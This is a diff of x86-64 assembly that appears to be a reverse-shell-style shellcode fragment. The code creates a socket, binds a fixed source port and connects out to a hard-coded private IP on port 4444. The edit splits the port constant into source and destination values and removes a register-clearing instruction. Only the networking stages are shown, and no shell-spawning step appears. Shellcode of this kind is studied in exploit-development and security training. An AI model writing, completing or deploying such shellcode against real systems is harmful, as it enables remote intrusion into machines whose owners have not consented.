@@ -1,8 +1,9 @@
 [BITS 64]
 global _start
 
-IP      equ 0x81b8a8c0
-PORT    equ 0x5c11
+IP       equ 0x81b8a8c0
+DPORT    equ 0x5c11
+SPORT    equ 0x5c11
 
 SYS_SOCKET  equ 0x29
 SYS_BIND    equ 0x31
@@ -16,7 +17,6 @@ SOCK_STREAM equ 0x1
 section .text
 _start:
     create_socket:
-        xor rdx, rdx
         push SOCK_STREAM
         pop rsi
         push AF_INET
@@ -32,7 +32,7 @@ _start:
     struct_sockaddr_bind:
         push rdx
         mov dword [rsp + 0x4], edx
-        mov  word [rsp + 0x2], PORT
+        mov  word [rsp + 0x2], SPORT
         mov  byte [rsp], AF_INET
 
     bind_socket:
@@ -46,7 +46,7 @@ _start:
  
     struct_sockaddr_connect:
         mov dword [rsp + 0x4], IP
-        mov  word [rsp + 0x2], PORT
+        mov  word [rsp + 0x2], DPORT
 
     connect_socket:
         push 0x10
